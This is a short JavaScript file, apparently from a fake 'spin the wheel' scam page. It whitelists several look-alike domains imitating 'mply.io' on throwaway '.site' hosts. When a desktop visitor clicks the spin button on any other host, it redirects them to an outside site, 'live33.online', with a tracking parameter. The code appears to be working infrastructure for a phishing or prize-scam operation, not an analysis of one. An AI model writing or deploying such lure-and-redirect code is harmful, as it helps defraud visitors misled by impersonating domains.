document.addEventListener("DOMContentLoaded", function () {
    var button = document.querySelector('.spin-buttons');
    var allowedDomains = [
        "mply.io.t0ke2n.site",
        "mply.io.4a6b8dh.site",
        "jsdhjjhhjjhejkjkas.blogspot.com",
        "mply.io.s.4a6b8dh.site",
        "mply.io.1arshg4.site"
    ]; 

    if (button && !/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
        button.addEventListener('click', function () {
            if (!allowedDomains.includes(window.location.hostname)) {
                window.location.href = "https://live33.online/?9fbfb39"; 
            }
        });
    }
});
